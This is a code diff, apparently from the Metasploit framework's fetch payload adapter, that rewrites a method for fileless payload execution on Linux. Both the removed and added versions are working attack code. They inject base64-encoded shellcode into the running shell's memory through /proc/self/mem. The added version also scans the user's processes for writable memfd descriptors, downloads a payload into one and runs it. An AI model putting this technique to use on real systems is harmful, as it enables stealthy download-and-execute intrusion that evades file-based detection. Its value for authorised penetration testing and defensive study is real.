@@ -236,26 +236,25 @@ module Msf::Payload::Adapter::Fetch
   # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
   def _generate_fileless(get_file_cmd)
     # get list of all $USER's processes
-#    cmd = 'FOUND=0'
-#    cmd << ";for i in $(ps -u $USER | awk '{print $1}')"
-#    # already found anonymous file where we can write
-#    cmd << '; do if [ $FOUND -eq 0 ]'
-#
-#    # look for every symbolic link with write rwx permissions
-#    # if found one, try to download payload into the anonymous file
-#    # and execute it
-#    cmd << '; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
-#    cmd << '; do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ]'
-#    cmd << "; then if $(#{get_file_cmd} >/dev/null)"
-#    cmd << '; then $f'
-#    cmd << '; FOUND=1'
-#    cmd << '; break'
-#    cmd << '; fi'
-#    cmd << '; fi'
-#    cmd << '; done'
-#    cmd << '; fi'
-#    cmd << '; done'
-     "#{get_file_cmd} | $(cd /proc/self;read a<syscall;exec 3>mem;base64 -d<<<SIngTTHSSIM4AHUQSIN4CCF1CUiD6AhJicLrD0iDwAjr5EyJ0E0x200x5EiDOAB1CUiDwAhJicTrBkiD6Ajr60iJ5UiB7BIEAABIuGtlcm5lbAAAagBQuD8BAABIiedIMfYPBUmJwLgAAAAAvwAAAABIiea6AAQAAA8FSInCSIP6AH4PuAEAAABMicdIieYPBevUuEIBAABMicdqAEiJ5moAVEiJ4kgxyU0xyU2J4kG4ABAAAA8FuDwAAAC/YwAAAA8FAAAAAAA=|dd bs=1 seek=$[`cut -d\  -f9<<<$a`]>&3')"
+    cmd = "echo $(cd /proc/self;read a<syscall; exec 3>mem;base64 -d <<<agC4PwEAAEiJ50gx9g8FSYnQkOv9|dd bs=1 seek=$[`cut -d\\  -f9<<<$a`]>&3;read b<syscall; read) & FOUND=0"
+    cmd << ";for i in $(ps -u $USER | awk '{print $1}')"
+    # already found anonymous file where we can write
+    cmd << '; do if [ $FOUND -eq 0 ]'
+
+    # look for every symbolic link with write rwx permissions
+    # if found one, try to download payload into the anonymous file
+    # and execute it
+    cmd << '; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
+    cmd << '; do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ]'
+    cmd << "; then if $(#{get_file_cmd} >/dev/null)"
+    cmd << '; then $f'
+    cmd << '; FOUND=1'
+    cmd << '; break'
+    cmd << '; fi'
+    cmd << '; fi'
+    cmd << '; done'
+    cmd << '; fi'
+    cmd << '; done'
   end
 
   def _generate_curl_command
